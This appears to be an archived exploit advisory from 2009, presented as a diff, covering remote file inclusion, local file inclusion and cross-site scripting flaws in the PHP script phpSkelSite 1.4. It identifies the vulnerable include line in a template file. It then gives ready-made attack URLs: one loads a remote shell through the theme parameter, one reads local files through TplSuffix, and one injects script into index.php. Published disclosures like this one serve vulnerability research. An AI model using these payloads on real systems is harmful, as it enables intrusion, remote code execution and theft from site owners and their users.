@@ -1,0 +1,33 @@
+-----------------:RFI/LFI/xss:-----------------
+-------------------------------------------
+script:phpSkelSite
+   
+------------------------------------------------------------------
+download from:http://apmuthu.tripod.com/files/phpSkelSite_v1.4.zip
+   
+------------------------------------------------------------------
+
+........................................................
+vul:/skysilver/login.tpl.php line 1
+
+<? include $theme.'/pageheading'.$TplSuffix ; ?>
+
+
+------------------------------------------------------
+Rfi:
+
+http://127.0.0.1/path/skysilver/login.tpl.php?theme=[shell.txt?]
+
+Lfi:
+
+http://127.0.0.1/path/skysilver/login.tpl.php?TplSuffix=[lfi]
+
+***************************************************
+xss:
+http://127.0.0.1/path/index.php/>"><ScRiPt>alert('ahmadbady')</ScRiPt>
+***************************************************
+---------------------
+Author: ahmadbady
+---------------------
+
+# milw0rm.com [2009-01-02]
